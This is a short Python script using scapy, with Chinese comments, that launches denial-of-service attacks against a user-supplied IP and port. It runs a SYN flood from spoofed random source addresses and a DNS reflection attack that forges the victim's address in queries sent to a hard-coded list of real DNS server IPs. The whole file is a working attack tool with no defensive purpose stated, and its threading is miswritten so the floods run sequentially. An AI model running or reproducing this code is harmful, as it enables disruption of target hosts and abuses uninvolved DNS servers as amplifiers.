from scapy.all import *
import random
import socket
import struct
import threading

#www.qq.com 对应的dns服务器的ip地址
dnsList = ["220.194.111.149","220.194.111.148","157.255.192.44","61.241.44.148","23.211.235.27"]

# 随机生成IP地址
def randomIPaddr() -> str:
    return socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))

# 伪造10个随机IP地址
srcIpList = [randomIPaddr() for i in range(100)]

# print(srcIpList)

#SYN-FLOOD 攻击方式
def synFlood(targetIP: str, targetPort: int):
    global srcIpList
    # 发送syn数据包的次数
    for i in range(1000):
        sPort = random.randrange(1024, 65535) #随机取源端口
        ipIndex = random.randrange(100) #随机取源ip在列表中的下标
        srcIp = srcIpList[ipIndex] #随机取源ip
        ipLayer = IP(src=srcIp, dst=targetIP) #ip层的参数设置
        tcpLayer = TCP(sport=sPort, dport=targetPort, flags='S') #tcp层的参数设置
        packet = ipLayer/tcpLayer #打包成一个数据包
        send(packet) #发送该数据包

#DNS放大反射攻击
def dnsReflect(targetIP: str, targetPort: int):
    global srcIpList,dnsList
    # 进行dns反射攻击的次数
    for i in range(1000):
        index = random.randrange(len(dnsList))
        #伪造被攻击者的IP对DNS发出请求，DNS便会返回报文给被攻击者，
        #从而达到让大量的DNS报文返回到被攻击者的目的，占用被攻击者的CPU以及网络资源
        ipLayer = IP(dst=dnsList[index], src=targetIP)
        udpLayer = UDP(dport=targetPort)
        dnsLayer = DNS(id=1, qr=0, opcode=0, tc=0, rd=1,
                       qdcount=1, ancount=0, nscount=0, arcount=0)
        dnsLayer.qd = DNSQR(qname="www.qq.com", qtype="TXT", qclass="IN")
        p = ipLayer/udpLayer/dnsLayer
        send(p)


def dos(targetIP: str, targetPort: int):
    t1 = threading.Thread(target=dnsReflect(targetIP,targetPort))
    t2 = threading.Thread(target=synFlood(targetIP,targetPort))
    t1.start()
    t2.start()

if __name__=='__main__':
        ip = input("targetIP:")
        port = int(input("targetPort:"))
        dos(ip,port)


